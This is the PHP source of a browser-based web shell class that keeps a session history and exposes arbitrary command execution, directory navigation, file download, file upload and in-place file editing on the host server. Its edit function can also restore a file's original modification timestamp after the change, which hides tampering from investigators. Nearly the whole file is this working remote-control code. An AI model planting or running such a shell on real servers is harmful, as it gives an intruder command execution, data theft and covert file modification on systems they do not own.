<?php
namespace ishibashiTokyo;

class Shell extends Commands
{
    public function SessionInit()
    {
        if (empty($_SESSION['webshell']['path'])) {
            $_SESSION['webshell']['path'] =  realpath('./');
        }

        if (empty($_SESSION['webshell']['history'])){
            $_SESSION['webshell']['history'] = '';
        }

        if (empty($_SESSION['webshell']['sys_user'])) {
            $_SESSION['webshell']['sys_user'] = trim(shell_exec('whoami'));
        }
    }

    public function History_CurrentDirectory()
    {
        $_SESSION['webshell']['history'] .= sprintf(
            '<div class="code shell">[%s@%s %s]</div>' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path']
        );
    }

    public function History_Command($cmd)
    {
        $_SESSION['webshell']['history'] .= sprintf(
            '<div class="code shell">$ %s</div>' . PHP_EOL,
            $cmd
        );
    }

    public function History_Result($result)
    {
        $_SESSION['webshell']['history'] .= sprintf('<div class="code">%s</div>' . PHP_EOL, $result);
    }

    public function clear()
    {
        $this->Cmd_clear();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function delete()
    {
        $this->Cmd_delete();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function cd($cmd)
    {
        $this->History_CurrentDirectory();
        $this->History_Command($cmd);
        $this->Cmd_cd($cmd);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function ll($cmd)
    {
        $this->History_CurrentDirectory();
        $this->History_Command($cmd);
        $this->History_Result($this->Cmd_ll($cmd));
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function exec($cmd)
    {
        $this->History_CurrentDirectory();
        $this->History_Command($cmd);
        $this->History_Result($this->Cmd_exec($cmd));
    }

    /**
     * ファイルダウンロード用ストリーム処理
     *
     * @param [type] $path
     * @return void
     */
    public function Download($path)
    {
        $path = urldecode($path);
        // ファイルに読み込み権限がない場合
        if (!is_readable($path)) {
            die($path);
        }

        $mimeType = (new \finfo(FILEINFO_MIME_TYPE))->file($path);
        if (!preg_match('/\A\S+?\/\S+/', $mimeType)) {
            $mimeType = 'application/octet-stream';
        }

        header('Content-Type: ' . $mimeType);
        header('X-Content-Type-Options: nosniff');
        header('Content-Length: ' . filesize($path));
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Connection: close');
        while (ob_get_level()) { ob_end_clean(); }
        readfile($path);
        exit;
    }

    public function Upload()
    {
        $this->History_CurrentDirectory();
        $this->History_Command('upload');

        if (! isset($_FILES["upload_file"])) {
            $this->History_Result('Error');
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        }

        for ($i = 0; $i < count($_FILES['upload_file']['error']); $i++) {
            if (! isset($_FILES['upload_file']['error'][$i]) || ! is_int($_FILES['upload_file']['error'][$i]) || $_FILES['upload_file']['error'][$i] !== 0){
                $this->History_Result('ファイルアップロードエラー: ' . $_FILES['upload_file']['name'][$i]);
                continue;
            }

            if (! is_uploaded_file($_FILES['upload_file']['tmp_name'][$i])) {
                $this->History_Result('アップロードできませんでした、アクセス権などを確認してください。: ' . $_FILES['upload_file']['name'][$i]);
                continue;
            }

            $_fullpath = $_SESSION['webshell']['path'] . '/' . $_FILES['upload_file']['name'][$i];

            if(move_uploaded_file( $_FILES['upload_file']['tmp_name'][$i], $_fullpath)) {
                chmod($_fullpath, 0644);
            }
            $this->History_Result('ファイルをアップロードしました: ' . $_FILES['upload_file']['name'][$i]);
        }

        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }


    public function Edit($path)
    {
        $path = urldecode($path);
        // ファイルに読み込み権限がない場合
        if (!is_readable($path)) {
            die($path);
        }

        $data = file_get_contents($path);

        require 'template/editor.tpl.php';
        exit();
    }

    public function Update($_update_option)
    {
        $this->History_CurrentDirectory();
        $this->History_Command('update');

        $stamp = filemtime($_update_option['path']);
        if (file_put_contents($_update_option['path'], $_update_option['data']) === false) {
            $this->History_Result('ファイルを保存できませんでした。権限を確認してください。: ' . $_update_option['path']);
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        }

        $this->History_Result('ファイルを保存しました: ' . $_update_option['path']);

        if ($_update_option['touch']) {
            if (touch($_update_option['path'], $stamp)) {
                $this->History_Result('最終更新のタイムスタンプを戻しました');
            }
            else {
                $this->History_Result('最終更新のタイムスタンプを戻せませんでした。権限を確認して下さい。');
            }
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

}